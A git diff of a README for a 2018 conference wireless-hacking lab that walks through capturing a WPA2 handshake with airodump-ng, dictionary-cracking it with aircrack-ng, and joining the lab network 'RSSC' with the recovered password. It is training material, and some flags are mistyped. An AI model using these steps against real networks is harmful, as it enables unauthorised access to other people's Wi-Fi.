@@ -1,9 +1,16 @@
 # RSSC2018-Wireless-Lab
 
-## Air Monitor
-Here we will walk through the process of cracking a WPA2 password.
+## Prerequisites
 
-1. The iwconfig command will show any wireless cards in the system. 
+In order to execute this lab, there are a few things you will need to get started:
+1. An access point broadcasting an SSID with a WPA2 password.
+2. Kali Linux installed to attack the target host from.
+3. A wireless card compatiable with Kali Linux to scan/monitor wireless networks in your vicinity. 
+
+## Air Monitor
+Here you will walk through the process of monitoring wireless networks and capturing a WPA2 handshake.
+
+1. The iwconfig command will show any wireless cards in the computer. 
 ```bash
 iwconfig
 ```
@@ -14,12 +21,12 @@ The operating system recognizes a wireless interface named wlan0.
 ifconfig wlan0 up
 ```
 
-3. Force the wireless card to scan and report on all wireless networks in the area. The SSID you are trying to target for this lab is named ‘RSSC’. You need the MAC address and the channel that this AP is transmitting on.
+3. Force the wireless card to scan and report on all wireless networks in the area. The SSID you are trying to target for this lab is named ‘RSSC’. You will need the MAC address and the channel that this AP is transmitting on.
 ```bash
 iwlist wlan0 scanning
 ```
 
-Next, we need to change the wireless card to monitoring mode. We do this by creating a monitor interface using airmon-ng. 
+Next, you need to change the wireless card to monitoring mode. You do this by creating a monitor interface using airmon-ng. 
 
 4. Verify airmon-ng sees your wireless card.
 ```bash
@@ -30,6 +37,7 @@ airmon-ng
 ```bash
 airmon-ng start wlan0
 ```
+More information on the commands used, or other information about airmon-ng can be found by running `man airmon-ng`.  
 
 6. Run the ifconfig command to verify the monitor interface is created. 
 ```bash
@@ -37,13 +45,34 @@ ifconfig
 ```
 We can see wlan0mon was created.
 
-7. Use airodump-ng to capture the WPA2 handshake. The attacker will have to catch someone in the act of authenticating to get a valid capture. We have a script running that acts as someone authenticating to the network and generating that WPA2 handshake. Airodump-ng will display a valid handshake when it captures it. It will display the handshake confirmation in the upper right-hand corner of the screen. We want a to get a few of these handshakes in our capture. Run this command for 15 seconds and then break out of it using ‘ctrl + C’.
+7. Use airodump-ng to capture the WPA2 handshake. You will have to catch someone in the act of authenticating to get a valid capture. We have a script running that acts as someone authenticating to the network and generating that WPA2 handshake. 
 ```bash
-airodump-ng wlan0mon –bssid <mac-address> --channel <channel> –write <filename>
+airodump-ng wlan0mon –bssid <mac-address> --channel <channel> –-write <filename>
+``` 
+Note: Replace the <mac-address> and <channel> with what you found in step 3 and <filename> with a filename. MAC address will need to use numbers, colons, and all caps. See below for correct command:
+```bash
+airodump-ng wlan0mon -bssid 00:30:44:27:E3:38 --channel 1 --write break
 ```
+airodump-ng will display a valid handshake when it captures it. It will display the handshake confirmation in the upper right-hand corner of the screen. We want a to get a few of these handshakes in our capture. Run this command for 15 seconds and then break out of it using ‘ctrl + C’. An 'ls' after you break out should display 'break-*.cap' file that we will use in the next step.
+  
+More information on the commands used, or other information about airodump-ng can be found by running `man airodump-ng`. 
+
 ## Password Cracking
 8. We will use aircrack-ng with the dictionary file to crack the password. 
 ```bash
-aircrack-ng <filename>.cap -a 2 -w <dictionary path>
+aircrack-ng break-01.cap -a 2 -w dictionary.txt
 ```
+*-a forces the attack mode. The '2' following -a is for WPA-PSK. A '1' is used for WEP.
+*-w is the dictionary file used for WPA cracking. In this case, 'dictionary.txt' is sitting in our home directory.
 
+After a few seconds, it should find the password needed to get onto the 'RSSC' network. It is 'Drowssap2'.
+
+More information on the commands used, or other information about aircrack-ng can be found by running `man aircrack-ng`. 
+
+9. Back on the Kali Linux desktop, select the icon at the bottom of the sidebar titled 'Show Applications'. Use the 'Type to search' box to search 'Settings' and open it. Select Wi-Fi and find 'RSSC' under 'Visible Networks'. Select it and type in the password to connect to the network.
+
+10. Back in terminal, type:
+```bash
+ping 192.168.0.1
+```
+This is pinging the AP/Router that is broadcasting this SSID. You have gotten onto the network.
